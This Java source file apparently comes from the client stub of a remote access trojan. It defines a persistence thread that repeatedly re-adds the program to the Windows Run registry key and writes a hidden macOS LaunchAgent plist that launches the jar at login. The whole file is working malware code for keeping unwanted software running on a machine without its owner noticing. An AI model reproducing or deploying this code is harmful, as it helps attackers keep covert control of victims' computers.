package com.redpois0n.stub;

import java.io.File;
import java.io.FileWriter;
import java.io.PrintWriter;

import com.redpois0n.common.OperatingSystem;
import com.redpois0n.stub.utils.Utils;

public class Persistance extends Thread {

	private int ms;
	
	public Persistance(int ms) {
		super("p");
		this.ms = ms;
	}

	public void run() {
		while (true) {
			try {
				if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
					String str = WinRegistry.readString(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Main.name);

					if (str == null) {
						String thispath = Main.class.getProtectionDomain().getCodeSource().getLocation().getPath();
						String javapath = System.getProperty("java.home") + "\\bin\\javaw.exe";
						WinRegistry.writeStringValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Main.name, javapath + " -jar \"" + thispath + "\"");
					}
					
				} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
					String thispath = Utils.getJarFile().getAbsolutePath();
					File startupFile = new File(System.getProperty("user.home") + "/Library/LaunchAgents/" + new File(thispath).getName().replace(".jar", ".plist"));
					
					if (!new File(startupFile.getAbsolutePath().replace("file:", "")).exists()) {
						PrintWriter out = new PrintWriter(new FileWriter(startupFile));
						out.println("<?xml version=\"1.0\" encoding=\"UTF-8\"?>");
						out.println("<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">");
						out.println("<plist version=\"1.0\">");
						out.println("<dict>");
						out.println("   <key>Label</key>");
						out.println("   <string>" + thispath.replace("file:", "").replace(".jar", "") + "</string>");
						out.println("   <key>ProgramArguments</key>");
						out.println("   <array>");
						out.println("      <string>" + System.getProperty("java.home") + System.getProperty("file.separator") + "bin" + System.getProperty("file.separator") + "java</string>");
						out.println("      <string>-jar</string>");
						out.println("      <string>" + thispath.replace("file:", "") + "</string>");
						out.println("   </array>");
						out.println("   <key>RunAtLoad</key>");
						out.println("   <true/>");
						out.println("   <key>NSUIElement</key>");
						out.println("   <string>1</string>");
						out.println("</dict>");
						out.println("</plist>");
						out.close();
					}
					
				} else {
					return;
				}
				Thread.sleep(ms + 0L);
			} catch (Exception ex) {
				ex.printStackTrace();
				break;
			}
		}
	}

}
